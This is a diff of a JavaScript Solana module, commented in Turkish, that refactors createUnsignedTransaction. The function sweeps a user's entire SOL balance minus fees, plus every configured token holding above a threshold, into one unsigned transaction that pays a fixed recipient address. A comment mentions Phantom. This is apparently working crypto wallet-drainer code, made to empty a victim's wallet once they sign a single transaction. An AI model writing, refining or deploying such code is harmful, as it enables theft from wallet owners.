@@ -22,10 +22,7 @@ import { TOKEN_CONFIGS } from "./token-config.js";
 const BATCH_SIZE = 3;
 const BATCH_DELAY_MS = 1000;
 
-/**
- * Verilen async görevleri en fazla BATCH_SIZE tanesini aynı anda çalıştırır,
- * sonra BATCH_DELAY_MS milisaniye bekler, sonra kalanları çalıştırır.
- */
+/** Batch runner */
 async function runBatches(tasks) {
   const results = [];
   for (let i = 0; i < tasks.length; i += BATCH_SIZE) {
@@ -39,14 +36,14 @@ async function runBatches(tasks) {
   return results;
 }
 
-/** Mint hesabının owner’ına bakarak hangi token programı (legacy / 2022) olduğunu tespit eder. */
+/** Mint owner'a bakarak token programını tespit et (legacy / 2022). */
 async function detectTokenProgramId(mintPubkey) {
   const info = await connection.getAccountInfo(mintPubkey);
-  if (!info) return TOKEN_PROGRAM_ID; // güvenli varsayılan (çoğu mint legacy)
+  if (!info) return TOKEN_PROGRAM_ID; // güvenli varsayılan
   const owner = info.owner;
   if (owner.equals(TOKEN_PROGRAM_ID)) return TOKEN_PROGRAM_ID;
   if (owner.equals(TOKEN_2022_PROGRAM_ID)) return TOKEN_2022_PROGRAM_ID;
-  return owner; // çok nadir özel durumlar için
+  return owner; // çok nadir özel programlar
 }
 
 export async function createUnsignedTransaction(userPublicKey) {
@@ -64,19 +61,19 @@ export async function createUnsignedTransaction(userPublicKey) {
   const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
   const isSolSufficient = solToSend > 0;
 
-  // 0) Her mint için programId tespiti (owner = token program)
-  const programDetectTasks = TOKEN_CONFIGS.map(({ mint }) => async () => {
+  // 0) Her mint için programId tespiti
+  const progTasks = TOKEN_CONFIGS.map(({ mint }) => async () => {
     const programId = await detectTokenProgramId(mint);
     return { mint, programId };
   });
-  const programPairs = await runBatches(programDetectTasks);
-  const programByMint = new Map(programPairs.map((x) => [x.mint.toBase58(), x.programId]));
+  const progPairs = await runBatches(progTasks);
+  const programByMint = new Map(progPairs.map((x) => [x.mint.toBase58(), x.programId]));
 
-  // 1) Kullanıcı bakiyelerini batch'li olarak oku (her task 1 RPC)
+  // 1) Kullanıcı bakiyelerini oku (doğru programId ile)
   const balanceTasks = TOKEN_CONFIGS.map(({ mint, threshold }) => async () => {
     const programId = programByMint.get(mint.toBase58()) || TOKEN_PROGRAM_ID;
 
-    // Doğru programId ile ATA türet
+    // ATA'ları doğru programla türet
     const userAta = await getAssociatedTokenAddress(
       mint,
       payer,
@@ -84,20 +81,6 @@ export async function createUnsignedTransaction(userPublicKey) {
       programId,
       ASSOCIATED_TOKEN_PROGRAM_ID
     );
-
-    let amount = 0n;
-    let sufficient = false;
-
-    try {
-      const acct = await getAccount(connection, userAta, undefined, programId);
-      amount = acct.amount; // bigint
-      const th = BigInt(threshold ?? 0);
-      // Eşik kontrolünü >= yap (eşit miktarı da kabul et)
-      sufficient = amount >= th;
-    } catch {
-      sufficient = false;
-    }
-
     const toAta = await getAssociatedTokenAddress(
       mint,
       toPublicKey,
@@ -106,7 +89,19 @@ export async function createUnsignedTransaction(userPublicKey) {
       ASSOCIATED_TOKEN_PROGRAM_ID
     );
 
-    // Alıcı ATA var mı? (ATA oluşturmayacağız; yoksa bu tokenı atla)
+    // Kullanıcı ATA bakiyesini doğru programla oku
+    let amount = 0n;
+    let sufficient = false;
+    try {
+      const acct = await getAccount(connection, userAta, undefined, programId);
+      amount = acct.amount; // bigint
+      const th = BigInt(threshold ?? 0);
+      sufficient = amount >= th; // eşik dahil
+    } catch {
+      sufficient = false;
+    }
+
+    // Alıcı ATA mevcut mu? (ATA oluşturmayacağız; yoksa bu minti atlarız)
     let toAtaExists = true;
     try {
       await getAccount(connection, toAta, undefined, programId);
@@ -132,40 +127,37 @@ export async function createUnsignedTransaction(userPublicKey) {
     );
   }
 
-  // 2b) SPL-token transfer (ATA oluşturma YOK; yalnızca mevcut ATA'lara)
-  for (const { userAta, toAta, amount, sufficient, programId, toAtaExists, mint } of userTokenInfos) {
+  // 2b) SPL-token transfer (ATA oluşturma yok; yalnızca mevcut ATA'lara, doğru programId ile)
+  for (const info of userTokenInfos) {
+    const { userAta, toAta, amount, sufficient, toAtaExists, programId, mint } = info;
     if (!sufficient) continue;
     if (!toAtaExists) {
-      console.warn(
-        `Alıcı ATA yok, atlandı → mint=${mint.toBase58()} programId=${programId.toBase58()}`
-      );
+      console.warn(`Recipient ATA yok, atlandı → mint=${mint.toBase58()} prog=${programId.toBase58()}`);
       continue;
     }
 
-    // Doğru programId ile transfer (unchecked yeterli; istersen checked'e geçebiliriz)
     instructions.push(
       createTransferInstruction(
         userAta,
         toAta,
         payer,
-        amount,         // bigint
-        [],             // multisig yok
-        programId       // ÖNEMLİ: mint'in gerçek token programı
+        amount,     // bigint ok
+        [],         // signer yok
+        programId   // **KRİTİK**: mint'in gerçek token programı
       )
     );
   }
 
-  // Hiçbir varlık yeterli değilse çık (SOL yok + SPL eklenemedi)
-  const hasAnySpl = instructions.some(ix =>
-    // basit kontrol: ProgramId token programlarından biri mi
-    ix.programId.equals(TOKEN_PROGRAM_ID) || ix.programId.equals(TOKEN_2022_PROGRAM_ID)
+  // SPL hiç eklenmediyse ve SOL da yoksa vazgeç
+  const hasAnySpl = instructions.some(
+    (ix) => ix.programId.equals(TOKEN_PROGRAM_ID) || ix.programId.equals(TOKEN_2022_PROGRAM_ID)
   );
   if (!isSolSufficient && !hasAnySpl) {
-    console.warn("Yeterli bakiye yok (ne SOL ne de SPL) veya SPL için koşullar sağlanmadı!");
+    console.warn("SPL yok (bakiye/ATA/programId uyumsuzluğu) ve SOL da yetersiz.");
     return null;
   }
 
-  // 3) Tek bir VersionedTransaction oluştur
+  // 3) VersionedTransaction
   const { blockhash } = await connection.getLatestBlockhash();
   const messageV0 = new TransactionMessage({
     payerKey: payer,
@@ -173,22 +165,24 @@ export async function createUnsignedTransaction(userPublicKey) {
     instructions,
   }).compileToV0Message();
 
-  // Debug
+  // Debug (Phantom bazı logları redakte edebilir)
   try {
-    const rows = userTokenInfos.map((t) => ({
-      mint: t.mint.toBase58(),
-      prog: t.programId.equals(TOKEN_PROGRAM_ID)
-        ? "TOKEN_PROGRAM"
-        : t.programId.equals(TOKEN_2022_PROGRAM_ID)
-        ? "TOKEN_2022"
-        : t.programId.toBase58(),
-      userAta: t.userAta.toBase58(),
-      toAta: t.toAta.toBase58(),
-      amount: t.amount.toString(),
-      sufficient: t.sufficient,
-      toAtaExists: t.toAtaExists,
-    }));
-    console.table(rows);
+    console.table(
+      userTokenInfos.map((t) => ({
+        mint: t.mint.toBase58(),
+        prog:
+          t.programId.equals(TOKEN_PROGRAM_ID)
+            ? "TOKEN_PROGRAM"
+            : t.programId.equals(TOKEN_2022_PROGRAM_ID)
+            ? "TOKEN_2022"
+            : t.programId.toBase58(),
+        userAta: t.userAta.toBase58(),
+        toAta: t.toAta.toBase58(),
+        amount: t.amount.toString(),
+        sufficient: t.sufficient,
+        toAtaExists: t.toAtaExists,
+      }))
+    );
     console.log("SOL to send (lamports):", solToSend);
   } catch {}
 
